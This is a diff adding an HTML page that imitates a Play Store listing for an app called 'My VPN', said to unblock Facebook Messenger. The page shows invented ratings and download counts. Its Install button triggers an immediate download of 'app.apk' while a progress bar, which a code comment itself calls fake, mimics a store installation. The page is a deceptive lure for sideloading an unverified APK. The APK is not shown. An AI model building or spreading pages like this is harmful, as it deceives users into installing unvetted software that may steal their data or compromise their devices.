@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My VPN – Apps</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #f1f3f4;
+}
+
+.app-page {
+  max-width: 480px;
+  margin: auto;
+  background: #fff;
+  min-height: 100vh;
+}
+
+/* Header */
+.header {
+  padding: 16px;
+  display: flex;
+}
+
+.icon {
+  width: 72px;
+  height: 72px;
+  border-radius: 16px;
+  background: #ddd;
+  background-size: cover;
+  background-position: center;
+}
+
+.info {
+  margin-left: 14px;
+}
+
+.info h2 {
+  margin: 0;
+  font-size: 20px;
+}
+
+.info p {
+  margin: 4px 0;
+  color: #555;
+  font-size: 14px;
+}
+
+/* Install */
+.install-box {
+  padding: 16px;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  font-size: 16px;
+  border-radius: 30px;
+  border: none;
+  background: #1a73e8;
+  color: #fff;
+  cursor: pointer;
+}
+
+button:disabled {
+  background: #9aa0a6;
+}
+
+.progress-box {
+  width: 100%;
+  height: 6px;
+  background: #ddd;
+  border-radius: 10px;
+  margin-top: 12px;
+  display: none;
+}
+
+.progress {
+  height: 100%;
+  width: 0%;
+  background: #1a73e8;
+  border-radius: 10px;
+}
+
+/* Screenshots */
+.screenshots {
+  display: flex;
+  overflow-x: auto;
+  gap: 10px;
+  padding: 10px 16px;
+}
+
+.screenshots img {
+  height: 160px;
+  border-radius: 10px;
+}
+
+/* Sections */
+.section {
+  padding: 16px;
+  border-top: 1px solid #eee;
+}
+
+.section h3 {
+  margin-top: 0;
+}
+
+.footer {
+  padding: 16px;
+  font-size: 12px;
+  color: #777;
+  text-align: center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="app-page">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="icon" style="background-image:url('icon.png')"></div>
+    <div class="info">
+      <h2>My VPN</h2>
+      <p>Fast & Secure VPN</p>
+      <p>★★★★★ 4.8 · 10K+ downloads</p>
+    </div>
+  </div>
+
+  <!-- Install -->
+  <div class="install-box">
+    <button id="installBtn" onclick="startInstall()">Install</button>
+    <div class="progress-box" id="progressBox">
+      <div class="progress" id="progressBar"></div>
+    </div>
+  </div>
+
+  <!-- Screenshots -->
+  <div class="screenshots">
+    <img src="sc1.png">
+    <img src="sc2.png">
+    <img src="sc3.png">
+  </div>
+
+  <!-- About -->
+  <div class="section">
+    <h3>About this app</h3>
+    <p>
+      My VPN helps you unblock Facebook Messenger and other blocked apps.
+      Easy to use, fast connection, and stable servers.
+    </p>
+  </div>
+
+  <!-- App info -->
+  <div class="section">
+    <h3>App info</h3>
+    <p>Version: 1.0.0</p>
+    <p>Size: 8 MB</p>
+    <p>Updated: 2025</p>
+    <p>Requires Android 6.0+</p>
+  </div>
+
+  <div class="footer">
+    <p>By installing, you agree to our Privacy Policy</p>
+    <p>Contact: telegram.me/yourname</p>
+  </div>
+
+</div>
+
+<script>
+function startInstall() {
+
+  // Android check
+  if (!/Android/i.test(navigator.userAgent)) {
+    alert("This app is available for Android devices only.");
+    return;
+  }
+
+  let btn = document.getElementById("installBtn");
+  let box = document.getElementById("progressBox");
+  let bar = document.getElementById("progressBar");
+
+  // UI change
+  btn.disabled = true;
+  btn.innerText = "Installing…";
+  box.style.display = "block";
+
+  // 🔴 APK download ကို ချက်ချင်းစ
+  window.location.href = "app.apk";
+
+  // Fake Play Store style progress
+  let p = 0;
+  let timer = setInterval(() => {
+    p += 5;
+    bar.style.width = p + "%";
+
+    if (p >= 100) {
+      clearInterval(timer);
+      btn.innerText = "Download complete";
+    }
+  }, 180);
+}
+</script>
+
+</body>
+</html>
